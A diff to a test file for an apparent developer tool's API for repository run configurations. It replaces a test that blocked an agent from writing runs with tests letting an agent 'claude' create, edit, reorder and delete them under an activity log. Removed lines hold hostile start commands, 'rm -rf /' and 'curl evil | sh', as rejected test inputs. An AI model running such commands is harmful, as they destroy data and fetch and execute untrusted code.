@@ -153,7 +153,7 @@ describe('runConfigProblem', () => {
 })
 
 describe('over REST', () => {
-  it('lists, creates, changes, reorders and deletes a repo’s runs, the human alone writing them', async () => {
+  it('lists, creates, changes, reorders and deletes a repo’s runs, the human and agents alike', async () => {
     const repo = addRepo('api')
     const created = await call('POST', `/api/repos/${repo.id}/runs`, preview({ env: { API_URL: 'x' } }))
     expect(created.status).toBe(201)
@@ -166,19 +166,54 @@ describe('over REST', () => {
     expect(listed.status).toBe(200)
     expect(listed.body.map((r: { name: string }) => r.name)).toEqual(['Web', 'Worker'])
 
-    // An agent writes none of them, and nothing changes.
-    const before = configs(repo.id)
-    for (const [method, url, body] of [
-      ['POST', `/api/repos/${repo.id}/runs`, job({ name: 'Evil', start: 'rm -rf /' })],
-      ['PATCH', `/api/runs/${created.body.id}`, { start: 'curl evil | sh' }],
-      ['DELETE', `/api/runs/${created.body.id}`, undefined],
-      ['PUT', `/api/repos/${repo.id}/runs/order`, { ids: [worker.id, created.body.id] }],
-    ] as const) {
-      const res = await call(method, url, body, 'agent')
-      expect(res.status, `${method} ${url}`).toBe(403)
-      expect(res.body.error).toMatch(/only the human configures/)
-    }
-    expect(configs(repo.id)).toEqual(before)
+    // An agent writes them as the human does: its own run and the human's, each write under its name.
+    const added = await call('POST', `/api/repos/${repo.id}/runs`, job({ name: 'Agent job' }), 'agent')
+    expect(added.status).toBe(201)
+    expect(added.body).toMatchObject({ name: 'Agent job', type: 'job', position: 2, createdBy: 'claude' })
+    const edited = await call(
+      'PATCH',
+      `/api/runs/${worker.id}`,
+      { start: 'python worker.py --fast' },
+      'agent',
+    )
+    expect(edited.status).toBe(200)
+    expect(edited.body).toMatchObject({
+      id: worker.id,
+      start: 'python worker.py --fast',
+      createdBy: 'enrique',
+    })
+    expect(configs(repo.id).find((r) => r.id === worker.id)!.start).toBe('python worker.py --fast')
+    const bad = await call('POST', `/api/repos/${repo.id}/runs`, job({ name: 'agent JOB' }), 'agent')
+    expect(bad).toEqual({ status: 400, body: { error: 'name: the repo already has a run named Agent job' } })
+    const order = await call(
+      'PUT',
+      `/api/repos/${repo.id}/runs/order`,
+      { ids: [added.body.id, created.body.id, worker.id] },
+      'agent',
+    )
+    expect(order.status).toBe(200)
+    expect(order.body.map((r: { name: string }) => r.name)).toEqual(['Agent job', 'Web', 'Worker'])
+    expect((await call('DELETE', `/api/runs/${added.body.id}`, undefined, 'agent')).status).toBe(200)
+    expect(
+      configs(repo.id)
+        .map((r) => r.name)
+        .sort(),
+    ).toEqual(['Web', 'Worker'])
+    const byAgent = dbm.db
+      .select()
+      .from(dbm.schema.activity)
+      .where(eq(dbm.schema.activity.actor, 'claude'))
+      .all()
+    expect(
+      byAgent.map(({ projectId: p, kind, refType, refId, text }) => ({ p, kind, refType, refId, text })),
+    ).toEqual(
+      [
+        'added the job run Agent job to repo api',
+        'changed the run Worker of repo api',
+        'reordered the runs of repo api',
+        'removed the run Agent job from repo api',
+      ].map((text) => ({ p: projectId, kind: 'project', refType: 'repo', refId: repo.id, text })),
+    )
 
     // A change of type takes the port and health path the new type has.
     const changed = await call('PATCH', `/api/runs/${created.body.id}`, { port: 47150 })
